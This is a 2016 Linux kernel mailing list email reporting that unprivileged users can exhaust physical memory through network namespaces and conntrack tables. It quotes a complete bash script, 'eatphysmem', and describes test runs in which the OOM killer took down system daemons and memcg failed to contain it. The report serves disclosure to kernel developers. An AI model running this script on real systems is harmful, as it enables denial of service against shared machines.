From: yumkam@gmail.com (Yuriy M. Kaminskiy)
Subject: Re: userns, netns, and quick physical memory consumption by unprivileged user
Date: Fri, 11 Mar 2016 18:06:59 +0300
Message-ID: <m3r3fhhx4c.fsf@gmail.com>
References: <m3d1rclioc.fsf@gmail.com>
Mime-Version: 1.0
Content-Type: text/plain
Cc: containers@lists.osdl.org, linux-kernel@vger.kernel.org
To: netdev@vger.kernel.org
Return-path: <netdev-owner@vger.kernel.org>
Received: from plane.gmane.org ([80.91.229.3]:38321 "EHLO plane.gmane.org"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1752628AbcCKPHg (ORCPT <rfc822;netdev@vger.kernel.org>);
	Fri, 11 Mar 2016 10:07:36 -0500
Received: from list by plane.gmane.org with local (Exim 4.69)
	(envelope-from <linux-netdev-2@m.gmane.org>)
	id 1aeOf2-00078O-AN
	for netdev@vger.kernel.org; Fri, 11 Mar 2016 16:07:28 +0100
Received: from ppp37-190-56-84.pppoe.spdop.ru ([37.190.56.84])
        by main.gmane.org with esmtp (Gmexim 0.1 (Debian))
        id 1AlnuQ-0007hv-00
        for <netdev@vger.kernel.org>; Fri, 11 Mar 2016 16:07:28 +0100
Received: from yumkam by ppp37-190-56-84.pppoe.spdop.ru with local (Gmexim 0.1 (Debian))
        id 1AlnuQ-0007hv-00
        for <netdev@vger.kernel.org>; Fri, 11 Mar 2016 16:07:28 +0100
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

ping (+ more test results at bottom)

On Wed, 02 Mar 2016, I wrote:

> While looking at CVE-2016-2847, I remembered about infamous
>     nf_conntrack: falling back to vmalloc
> message, that was often triggered by network namespace creation (message
> was removed recently, but it changed nothing with underlying problem).
>
> So, how about something like this:
>
> $ cat << EOF >> eatphysmem
> #!/bin/bash -xe
> fd=6
> d="`mktemp -d /tmp/eatmemXXXXXXXXX`"
> cd "$d"
> rule="iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT"
> # rule="$rule;$rule"
> # ... just because we can; same with any number of ip li/ro/ru/etc
> while :; do
>     let fd=fd+1
>     [ ! -e /proc/$$/fd/$fd ] || continue
>     mkfifo f1 f2
>     unshare -rn sh -xec "echo foo >f1;ip li se lo up; $rule;read r <f2" &
>     pid=$!
>     read r <f1
>     eval "exec $fd</proc/$pid/ns/net"
>     echo bar >f2
>     wait
>     rm f2 f1
>     free
>     sleep 0.1s
> done
> sleep inf
> EOF
> $ chmod a+x eatphysmem; unshare -rpf --mount-proc ./eatphysmem
> ?
>
> You can easily eat 0.5M physical memory per netns (conntrack hash table
> (hashsize*sizeof(list_head))) and more, and pin them to single process
> with opened netns fds.
> What can stop it?
> ulimit? What is ulimit? Conntrack knows nothing about them.
> Ah-yeah, `ulimit -n`? 64k. 64k*512k = 32G. Per process. Oh-uh.
> OOM killer? But this is not this process memory; if any, it will be
> killed last.
> (I wonder, if memcg can tackle it; probably yes; but how many people
> have it configured?).

I tested in vm with kernel 4.4.2 (from user account, with ulimit
-v 32768); as expected, it quickly eaten all memory, OOM killer went
berserk and killed even systemd-journald and systemd-udevd, but left
this process living (and hogging all physical memory; also note that
swap was enabled - and mostly remained unused).

And also tried with memcg:
  t=/sys/fs/cgroup/memory/test1;mkdir $t;echo 0 >$t/tasks;
  echo 48M >$t/memory.limit_in_bytes; su testuser [...]
and it has not helped at all (rather opposite, it ended up with killed
init and kernel panic; well, later is pure (un)luck; but point is, memcg
apparently *CANNOT* curb net/ns allocations).

BTW, all those hash/conntrack/etc default sizes was calculated from
physical memory size in assumption there will be only *one* instance of
those tables. Obviously, introduction of network namespaces (and
especially unprivileged user-ns) thrown this assumption in the window
(and here comes that "falling back to vmalloc" message again; in pre-netns
world, those tables were allocated *once* on early system startup, with
typically plenty of free and unfragmented memory).
